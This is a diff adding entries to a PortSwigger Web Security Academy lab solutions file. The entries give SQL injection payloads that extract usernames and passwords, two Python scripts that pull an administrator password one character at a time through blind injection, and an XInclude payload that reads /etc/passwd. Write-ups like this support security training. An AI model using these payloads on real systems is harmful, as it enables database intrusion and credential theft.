@@ -33,6 +33,150 @@ Solution:
 
     curl -s https://ac961fbe1e874560c0a53e2700c50025.web-security-academy.net/login -d 'csrf=02gPIAfYLxmgx07NosP5ChXUji8LZDi0&username=administrator&password=%27+or+%271%27%3D%271'
 
+## Lab: SQL injection UNION attack, determining the number of columns returned by the query
+
+    https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns
+
+Payload:
+
+    ' union select null,null,null--
+
+### Lab: SQL injection UNION attack, finding a column containing text
+
+    https://portswigger.net/web-security/sql-injection/union-attacks/lab-find-column-containing-text
+
+Payload:
+
+    ' union select null,'We2TqZ',null--
+
+### Lab: SQL injection UNION attack, retrieving data from other tables
+
+    https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-data-from-other-tables
+
+Payload:
+
+    ' union select username,password FROM users--
+
+### Lab: SQL injection UNION attack, retrieving multiple values in a single column
+
+    https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-multiple-values-in-single-column
+
+Payload:
+
+    ' union select null,concat(username,password) FROM users--
+
+### Lab: SQL injection attack, querying the database type and version on Oracle
+
+    https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-oracle
+
+Payload:
+
+    ' UNION SELECT banner,null FROM v$version --
+
+### Lab: SQL injection attack, querying the database type and version on MySQL and Microsoft
+
+    https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-mysql-microsoft
+
+Payload:
+
+    ' union select @@version,null--%20
+
+### Lab: SQL injection attack, listing the database contents on non-Oracle databases
+
+    https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-non-oracle
+
+List tables:
+
+    %27%20union%20select+TABLE_NAME,null+FROM+information_schema.tables--
+
+List column names from selected table:
+
+    %27%20union%20select+COLUMN_NAME,null+FROM+information_schema.columns+WHERE+table_name+=+'users_dxfmgd'--
+
+List users and passwords:
+
+    %27%20union%20select+username_ppvobv,password_vddlrf+FROM+users_dxfmgd--
+
+### Lab: SQL injection attack, listing the database contents on Oracle
+
+    https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-oracle
+
+### Lab: Blind SQL injection with conditional responses
+
+    https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses
+
+Solution:
+
+```
+#!/usr/bin/python3
+
+# (http://docs.python-requests.org/en/latest/)
+import requests
+from requests import get
+import sys
+
+s = requests.session()
+
+for j in range(1,21):
+    for i in range(48,122):
+
+        payload = "sA0oQJbDuua9SbuH'+AND+ASCII(SUBSTR((SELECT+Password+FROM+Users+WHERE+Username+%3d+'administrator'),"+str(j)+","+str(j)+"))="+str(i)+"--+"
+        cookie = dict(TrackingId=payload)
+        r = s.get("https://0a07001f038c1271c616462c001d0021.web-security-academy.net/filter?category=Pets", headers=headers, cookies=cookie)
+
+        if 'Welcome back!' in r.text:
+            print(chr(i))
+            break
+```
+
+### Lab: Blind SQL injection with conditional errors
+
+    https://portswigger.net/web-security/sql-injection/blind/lab-conditional-errors
+
+Solution:
+
+```
+#!/usr/bin/python3
+
+# (http://docs.python-requests.org/en/latest/)
+import requests
+from requests import get
+import sys
+
+s = requests.session()
+
+for j in range(1,21):
+    for i in range(48,122):
+
+        payload = "YHjR3e0Tqh1FkBsZ' AND (SELECT CASE WHEN (ASCII(SUBSTR(Password, "+str(j)+","+str(j)+")) = "+str(i)+") THEN TO_CHAR(1/0) ELSE 'a' END FROM users WHERE username='administrator')='a"
+        cookie = dict(TrackingId=payload)
+        r = s.get("https://0a3d009603a90aa2c3a970580085001c.web-security-academy.net/filter?category=Gifts", cookies=cookie)
+
+        if r.status_code == 500:
+            print(chr(i))
+            break
+```
+
+### Lab: Blind SQL injection with time delays
+
+    https://portswigger.net/web-security/sql-injection/blind/lab-time-delays
+
+### Lab: Blind SQL injection with time delays and information retrieval
+
+    https://portswigger.net/web-security/sql-injection/blind/lab-time-delays-info-retrieval
+
+### Lab: Blind SQL injection with out-of-band interaction
+
+    https://portswigger.net/web-security/sql-injection/blind/lab-out-of-band
+
+### Lab: Blind SQL injection with out-of-band data exfiltration
+
+    https://portswigger.net/web-security/sql-injection/blind/lab-out-of-band-data-exfiltration
+
+### Lab: SQL injection with filter bypass via XML encoding
+
+    https://portswigger.net/web-security/sql-injection/lab-sql-injection-with-filter-bypass-via-xml-encoding
+
 ## XSS
 
 ### Lab: Reflected XSS into HTML context with nothing encoded
@@ -1385,5 +1529,25 @@ Modify `sub` field in JWT's payload to `administrator`. Modify `alg` field in JW
 **Mitigation**
 
 Require JWT signature on the backend and reject requests with `null` signature.
+
+## Essential skills
+
+### Lab: Discovering vulnerabilities quickly with targeted scanning
+
+Payload:
+
+```
+<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>
+```
+
+Raw request:
+
+```
+POST /product/stock HTTP/1.1
+[...]
+Connection: close
+
+productId=<foo+xmlns%3axi%3d"http%3a//www.w3.org/2001/XInclude"><xi%3ainclude+parse%3d"text"+href%3d"file%3a///etc/passwd"/></foo>&storeId=2
+```
 
 
